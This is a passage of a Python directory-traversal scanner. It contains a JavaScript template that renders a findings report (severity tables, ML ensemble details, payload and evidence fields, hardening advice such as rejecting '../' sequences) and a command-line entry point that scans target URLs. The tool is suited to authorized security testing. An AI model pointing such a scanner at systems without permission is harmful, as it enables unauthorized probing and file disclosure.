  Document, Packer, Paragraph, TextRun, Table, TableRow, TableCell,
  HeadingLevel, AlignmentType, BorderStyle, WidthType, ShadingType,
  VerticalAlign, PageNumber, PageBreak, LevelFormat, Header, Footer,
} = require('docx');

const rawData = JSON.parse(fs.readFileSync('data/report_data.json','utf8'));
const { output_path, scan_date, findings, stats, severity_counts } = rawData;

const COLORS = {
  critical: 'C0392B', high: 'E74C3C', medium: 'E67E22',
  low:      'F1C40F', info: '3498DB', header: '1A1A2E',
  subhdr:   '16213E', accent: '0F3460', white: 'FFFFFF',
  lightgray:'F8F9FA', border: 'DEE2E6',
};

const border = { style: BorderStyle.SINGLE, size: 1, color: COLORS.border };
const borders = { top: border, bottom: border, left: border, right: border };

function hdrCell(text, w, color='1A1A2E') {
  return new TableCell({
    borders, width: { size: w, type: WidthType.DXA },
    shading: { fill: color, type: ShadingType.CLEAR },
    margins: { top: 80, bottom: 80, left: 120, right: 120 },
    verticalAlign: VerticalAlign.CENTER,
    children: [new Paragraph({ alignment: AlignmentType.CENTER,
      children: [new TextRun({ text, bold: true, color: COLORS.white, size: 18, font: 'Arial' })] })],
  });
}

function dataCell(text, w, color='F8F9FA', bold=false, textColor='000000') {
  return new TableCell({
    borders, width: { size: w, type: WidthType.DXA },
    shading: { fill: color, type: ShadingType.CLEAR },
    margins: { top: 60, bottom: 60, left: 100, right: 100 },
    children: [new Paragraph({ children: [
      new TextRun({ text: String(text||''), bold, color: textColor, size: 18, font: 'Arial' })
    ]})],
  });
}

function severityColor(sev) {
  const m = { Critical: COLORS.critical, High: COLORS.high, Medium: COLORS.medium, Low: COLORS.low };
  return m[sev] || COLORS.info;
}
function cvssRating(c) {
  if (c >= 9.0) return 'Critical'; if (c >= 7.0) return 'High';
  if (c >= 4.0) return 'Medium';   if (c > 0)    return 'Low';
  return 'Info';
}

// ── COVER PAGE ──────────────────────────────────
const coverPage = [
  new Paragraph({ spacing: { before: 2880 }, alignment: AlignmentType.CENTER,
    children: [new TextRun({ text: 'DIRECTORY TRAVERSAL', bold: true, size: 52, font: 'Arial', color: COLORS.header })] }),
  new Paragraph({ alignment: AlignmentType.CENTER,
    children: [new TextRun({ text: 'VULNERABILITY ASSESSMENT REPORT', bold: true, size: 36, font: 'Arial', color: COLORS.accent })] }),
  new Paragraph({ spacing: { before: 480 }, alignment: AlignmentType.CENTER,
    children: [new TextRun({ text: '⚡ ML-Powered Security Analysis', size: 24, font: 'Arial', color: '7F8C8D', italics: true })] }),
  new Paragraph({ spacing: { before: 720 },
    border: { bottom: { style: BorderStyle.SINGLE, size: 4, color: COLORS.accent, space: 1 } },
    children: [] }),
  new Paragraph({ spacing: { before: 480 }, alignment: AlignmentType.CENTER,
    children: [new TextRun({ text: `Report Date: ${scan_date}`, size: 22, font: 'Arial', color: '555555' })] }),
  new Paragraph({ spacing: { before: 200 }, alignment: AlignmentType.CENTER,
    children: [new TextRun({ text: `Classification: CONFIDENTIAL`, bold: true, size: 22, font: 'Arial', color: COLORS.critical })] }),
  new Paragraph({ children: [new PageBreak()] }),
];

// ── EXECUTIVE SUMMARY ───────────────────────────
const totalFindings = Object.values(severity_counts).reduce((a,b)=>a+b,0);
const riskLevel = severity_counts.critical > 0 ? 'CRITICAL' : severity_counts.high > 0 ? 'HIGH' : 'MEDIUM';
const riskColor = riskLevel === 'CRITICAL' ? COLORS.critical : riskLevel === 'HIGH' ? COLORS.high : COLORS.medium;

const execSummary = [
  new Paragraph({ heading: HeadingLevel.HEADING_1,
    children: [new TextRun({ text: '1. Executive Summary', font: 'Arial', bold: true, size: 32 })] }),
  new Paragraph({ spacing: { before: 200, after: 200 },
    children: [new TextRun({ text:
      `This report presents findings from an automated directory traversal vulnerability assessment ` +
      `conducted using ML-powered scanning technology. The scan identified ${totalFindings} findings ` +
      `across the target infrastructure, with an overall risk rating of `, size: 22, font: 'Arial' }),
      new TextRun({ text: riskLevel, bold: true, color: riskColor, size: 22, font: 'Arial' }),
      new TextRun({ text: '.', size: 22, font: 'Arial' })
    ]}),
];

// Risk summary table
const summaryTable = new Table({
  width: { size: 9360, type: WidthType.DXA },
  columnWidths: [2340, 2340, 2340, 2340],
  rows: [
    new TableRow({ children: [
      hdrCell('CRITICAL', 2340, COLORS.critical),
      hdrCell('HIGH', 2340, COLORS.high),
      hdrCell('MEDIUM', 2340, COLORS.medium),
      hdrCell('LOW', 2340, COLORS.low),
    ]}),
    new TableRow({ children: [
      dataCell(severity_counts.critical, 2340, 'FFF0F0', true, COLORS.critical),
      dataCell(severity_counts.high,     2340, 'FFF5F5', true, COLORS.high),
      dataCell(severity_counts.medium,   2340, 'FFFAF0', true, COLORS.medium),
      dataCell(severity_counts.low,      2340, 'FFFFF0', true, '7D6608'),
    ]}),
  ],
});

execSummary.push(summaryTable);
execSummary.push(new Paragraph({ spacing: { before: 400 },
  children: [new TextRun({ text: 'Scan Statistics', bold: true, size: 26, font: 'Arial' })] }));

const statsTable = new Table({
  width: { size: 9360, type: WidthType.DXA },
  columnWidths: [4680, 4680],
  rows: [
    new TableRow({ children: [ hdrCell('Metric', 4680), hdrCell('Value', 4680) ] }),
    ...Object.entries({
      'Total HTTP Requests':    stats.requests_made || 0,
      'Endpoints Discovered':   stats.endpoints_discovered || 0,
      'Scan Duration':          `${stats.scan_duration_sec || 0}s`,
      'ML Model':               'Ensemble (RF + GB + MLP + IsolationForest)',
      'Total Findings':         totalFindings,
    }).map(([k,v], i) => new TableRow({ children: [
      dataCell(k, 4680, i%2===0?'F8F9FA':'FFFFFF', true),
      dataCell(v, 4680, i%2===0?'F8F9FA':'FFFFFF'),
    ]})),
  ],
});

execSummary.push(statsTable);
execSummary.push(new Paragraph({ children: [new PageBreak()] }));

// ── ML ANALYSIS SECTION ─────────────────────────
const mlSection = [
  new Paragraph({ heading: HeadingLevel.HEADING_1,
    children: [new TextRun({ text: '2. ML-Assisted Analysis', bold: true, size: 32, font: 'Arial' })] }),
  new Paragraph({ spacing: { before: 200, after: 200 },
    children: [new TextRun({ text:
      'The scanner employs an ensemble of four machine learning models: Isolation Forest for anomaly ' +
      'detection, Random Forest Classifier, Gradient Boosting Classifier, and a Multi-Layer Perceptron ' +
      'neural network. Models are trained on synthetic data and then retrained in-session using real ' +
      'scan results, continuously improving detection accuracy.',
      size: 22, font: 'Arial' })] }),
  new Paragraph({ spacing: { before: 200 },
    children: [new TextRun({ text: 'Model Ensemble Architecture:', bold: true, size: 22, font: 'Arial' })] }),
  ...['Isolation Forest — Anomaly detection for unusual response patterns',
      'Random Forest (200 trees) — Supervised classification of traversal success',
      'Gradient Boosting (150 estimators) — Boosted ensemble for high-precision detection',
      'MLP Neural Network (128→64→32) — Deep pattern recognition in feature space',
  ].map(t => new Paragraph({ spacing: { before: 80 },
    numbering: { reference: 'bullets', level: 0 },
    children: [new TextRun({ text: t, size: 20, font: 'Arial' })] })),
  new Paragraph({ children: [new PageBreak()] }),
];

// ── DETAILED FINDINGS ───────────────────────────
const findingSection = [
  new Paragraph({ heading: HeadingLevel.HEADING_1,
    children: [new TextRun({ text: '3. Detailed Findings', bold: true, size: 32, font: 'Arial' })] }),
];

if (findings.length === 0) {
  findingSection.push(new Paragraph({ spacing: { before: 200 },
    children: [new TextRun({ text: 'No confirmed vulnerabilities found during this scan.', size: 22, font: 'Arial' })] }));
} else {
  findings.forEach((f, idx) => {
    const sev      = f.severity || 'Info';
    const sevColor = severityColor(sev);
    const mlConf   = f.ml_prediction ? `${(f.ml_prediction.confidence * 100).toFixed(1)}%` : 'N/A';
    const cvss     = typeof f.cvss === 'number' ? f.cvss.toFixed(1) : '0.0';
    const evidence = (f.evidence||[]).map(e=>e.indicator).join(', ') || 'ML-flagged anomaly';

    findingSection.push(
      new Paragraph({ spacing: { before: 400 }, heading: HeadingLevel.HEADING_2,
        children: [new TextRun({ text: `Finding #${idx+1}: ${sev} – ${f.category||'Unknown'}`,
          bold: true, size: 26, font: 'Arial', color: sevColor })] }),
    );

    const fTable = new Table({
      width: { size: 9360, type: WidthType.DXA },
      columnWidths: [2500, 6860],
      rows: [
        new TableRow({ children: [ hdrCell('Field', 2500), hdrCell('Value', 6860) ] }),
        ...([
          ['Target URL',      f.url || 'N/A'],
          ['Parameter',       f.parameter || 'N/A'],
          ['HTTP Method',     f.method || 'GET'],
          ['Payload',         f.payload || 'N/A'],
          ['Payload Category',f.payload_category || 'N/A'],
          ['Severity',        sev],
          ['CVSS Score',      `${cvss} (${cvssRating(parseFloat(cvss))})`],
          ['ML Confidence',   mlConf],
          ['Status Code',     String(f.status_code || 'N/A')],
          ['Response Size',   `${f.response_size || 0} bytes`],
          ['Evidence',        evidence],
          ['ML Flagged',      f.ml_flagged ? 'Yes (anomaly detected)' : 'No'],
        ].map(([k,v], i) => new TableRow({ children: [
          dataCell(k, 2500, i%2===0?'EBF5FB':'FFFFFF', true),
          dataCell(v, 6860, i%2===0?'EBF5FB':'FFFFFF',
            k==='Severity', k==='Severity' ? sevColor : '000000'),
        ]})))
      ],
    });

    findingSection.push(fTable);
  });
}
findingSection.push(new Paragraph({ children: [new PageBreak()] }));

// ── RECOMMENDATIONS ─────────────────────────────
const recommendations = [
  new Paragraph({ heading: HeadingLevel.HEADING_1,
    children: [new TextRun({ text: '4. Recommendations', bold: true, size: 32, font: 'Arial' })] }),
  ...([
    ['Input Validation & Sanitization', 'Implement strict allowlists for file paths. Reject any input containing traversal sequences (../, ..\\ , encoded variants). Use basename() or realpath() and verify the resolved path stays within the allowed directory.'],
    ['Disable Directory Listing', 'Ensure Apache/Nginx does not serve directory listings. In Apache: Options -Indexes. In Nginx: autoindex off.'],
    ['Use Chroot / Containers', 'Run web application processes in a chroot jail or container with minimal filesystem access. The process should have no visibility outside its document root.'],
    ['WAF Rules', 'Deploy ModSecurity or cloud WAF rules specifically targeting path traversal: CRS rules 930100, 930110, 930120, 930130.'],
    ['Least Privilege', 'Web server processes should run as low-privilege users with read-only access to only required directories.'],
    ['File Access Abstraction', 'Never pass user-supplied filenames directly to filesystem calls. Use an internal mapping or UUID to reference files.'],
    ['Security Headers', 'Implement X-Frame-Options, X-Content-Type-Options, Content-Security-Policy, and Strict-Transport-Security headers.'],
    ['Regular Scanning', 'Schedule automated directory traversal scans as part of CI/CD pipeline and before each deployment.'],
  ].map(([title, body]) => [
    new Paragraph({ spacing: { before: 300 },
      children: [new TextRun({ text: title, bold: true, size: 22, font: 'Arial', color: COLORS.accent })] }),
    new Paragraph({ spacing: { before: 100, after: 200 },
      children: [new TextRun({ text: body, size: 20, font: 'Arial' })] }),
  ]).flat()),
];

// ── ASSEMBLE DOCUMENT ───────────────────────────
const doc = new Document({
  numbering: { config: [{
    reference: 'bullets',
    levels: [{ level: 0, format: LevelFormat.BULLET, text: '•', alignment: AlignmentType.LEFT,
      style: { paragraph: { indent: { left: 720, hanging: 360 } } } }],
  }]},
  styles: {
    default: { document: { run: { font: 'Arial', size: 22 } } },
    paragraphStyles: [
      { id: 'Heading1', name: 'Heading 1', basedOn: 'Normal', next: 'Normal', quickFormat: true,
        run: { size: 32, bold: true, font: 'Arial', color: COLORS.header },
        paragraph: { spacing: { before: 480, after: 240 }, outlineLevel: 0,
          border: { bottom: { style: BorderStyle.SINGLE, size: 3, color: COLORS.accent, space: 4 } } } },
      { id: 'Heading2', name: 'Heading 2', basedOn: 'Normal', next: 'Normal', quickFormat: true,
        run: { size: 26, bold: true, font: 'Arial' },
        paragraph: { spacing: { before: 360, after: 180 }, outlineLevel: 1 } },
    ],
  },
  sections: [{
    properties: {
      page: {
        size: { width: 12240, height: 15840 },
        margin: { top: 1440, right: 1440, bottom: 1440, left: 1440 },
      },
    },
    footers: {
      default: new Footer({ children: [
        new Paragraph({ alignment: AlignmentType.CENTER, children: [
          new TextRun({ text: 'CONFIDENTIAL — Directory Traversal Scan Report  |  Page ', size: 18, font: 'Arial', color: '666666' }),
          new TextRun({ children: [PageNumber.CURRENT], size: 18, font: 'Arial', color: '666666' }),
        ]}),
      ]}),
    },
    children: [
      ...coverPage, ...execSummary, ...mlSection,
      ...findingSection, ...recommendations,
    ],
  }],
});

// ── TERMINAL FINDINGS SUMMARY ───────────────────
console.log('\n' + '='.repeat(70));
console.log('  DIRECTORY TRAVERSAL SCAN - FINDINGS SUMMARY');
console.log('='.repeat(70));
console.log(`  Scan Date  : ${scan_date}`);
console.log(`  Total      : ${totalFindings}  |  Risk Level: ${riskLevel}`);
console.log(`  Critical: ${severity_counts.critical}  High: ${severity_counts.high}  Medium: ${severity_counts.medium}  Low: ${severity_counts.low}`);
console.log('-'.repeat(70));

if (findings.length === 0) {
  console.log('  No confirmed vulnerabilities found.');
} else {
  findings.forEach((f, i) => {
    const sev    = f.severity || 'Info';
    const url    = f.url || 'N/A';
    const param  = f.parameter || 'N/A';
    const cvss   = typeof f.cvss === 'number' ? f.cvss.toFixed(1) : '0.0';
    const conf   = f.ml_prediction ? `${(f.ml_prediction.confidence * 100).toFixed(1)}%` : 'N/A';
    const evid   = (f.evidence||[]).map(e=>e.indicator).join(', ') || 'ML-flagged anomaly';
    const label  = sev.padEnd(8);
    console.log(`  [${String(i+1).padStart(2,'0')}] ${label} | CVSS ${cvss} | ML Conf: ${conf}`);
    console.log(`       URL   : ${url}`);
    console.log(`       Param : ${param}  |  Payload: ${(f.payload||'N/A').substring(0,60)}`);
    console.log(`       Evidence: ${evid}`);
    console.log('  ' + '-'.repeat(68));
  });
}
console.log('='.repeat(70) + '\n');

Packer.toBuffer(doc).then(buf => {
  fs.writeFileSync(output_path, buf);
  console.log('REPORT_OK:' + output_path);
}).catch(e => { console.error(e); process.exit(1); });
"""

# ─────────────────────────────────────────────────
#  CLI ENTRY POINT
# ─────────────────────────────────────────────────

def main():
    import argparse

    parser = argparse.ArgumentParser(
        description="ML-Powered Directory Traversal Scanner",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python ml_dir_traversal_scanner.py -t http://target.com
  python ml_dir_traversal_scanner.py -t http://t1.com http://t2.com --delay 0.3
  python ml_dir_traversal_scanner.py -t http://target.com --train-only
  python ml_dir_traversal_scanner.py -t http://target.com --proxy http://127.0.0.1:8080
        """
    )
    parser.add_argument("-t",  "--targets",    nargs="+", required=True, help="Target URL(s)")
    parser.add_argument("--timeout",           type=float, default=10,   help="Request timeout (s)")
    parser.add_argument("--delay",             type=float, default=0.15, help="Delay between requests (s)")
    parser.add_argument("--proxy",             default=None,             help="HTTP proxy (e.g. http://127.0.0.1:8080)")
    parser.add_argument("--train-only",        action="store_true",      help="Train/retrain ML models and exit")
    parser.add_argument("--output",            default=None,             help="Output report path (.docx)")
    parser.add_argument("--json-output",       default=None,             help="Save raw findings as JSON")

    args = parser.parse_args()

    config = {
        "timeout": args.timeout,
        "delay":   args.delay,
        "proxies": {"http": args.proxy, "https": args.proxy} if args.proxy else None,
    }

    if args.train_only:
        engine = MLEngine()
        engine.train_models()
        console.print("[bold green]✅ Training complete. Models saved.[/bold green]")
        return

    scanner  = DirectoryTraversalScanner(config)
    results  = scanner.run(args.targets)

    # Save JSON results
    json_out = args.json_output or str(DATA_DIR / f"results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
    with open(json_out, "w") as f:
        json.dump(results, f, indent=2, default=str)
    console.print(f"[dim]📁 Raw results: {json_out}[/dim]")

    # Generate DOCX report
    console.print("\n[bold cyan]📝 Generating DOCX report...[/bold cyan]")
    reporter = ReportGenerator()
    report_path = reporter.generate(results, args.output)

    if report_path:
        console.print(Panel(
            f"[bold green]✅ Scan complete![/bold green]\n\n"
            f"📄 Report:  [cyan]{report_path}[/cyan]\n"
            f"📁 JSON:    [cyan]{json_out}[/cyan]\n"
            f"💾 Models:  [cyan]{MODEL_DIR}/[/cyan]",
            title="[bold]DONE[/bold]", expand=False
        ))

if __name__ == "__main__":
    main()